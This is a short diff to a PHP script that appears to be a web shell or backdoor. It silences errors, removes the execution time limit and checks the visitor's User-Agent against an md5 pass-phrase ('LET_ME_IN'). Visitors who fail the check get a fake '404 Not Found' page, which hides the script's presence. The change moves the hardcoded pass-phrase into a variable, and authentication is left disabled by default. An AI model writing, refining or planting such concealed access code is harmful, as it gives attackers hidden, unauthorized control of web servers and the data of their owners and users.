@@ -1,6 +1,8 @@
 <?
 $use_auth = FALSE; // TODO: switch to TRUE before use
 
+$pwd = "LET_ME_IN"; // TODO: change pass-phrase before use
+
 error_reporting(0);
 
 set_time_limit(0);
@@ -14,7 +16,7 @@ header("Pragma: no-cache");
 
 if ($use_auth)
 {
-	if ($_SERVER["HTTP_USER_AGENT"] != md5("LET_ME_IN")) // TODO: change pass-phrase before use
+	if ($_SERVER["HTTP_USER_AGENT"] != md5($pwd)) 
 	{
 		exit( sprintf("
 			<h1>404 Not Found</h1>
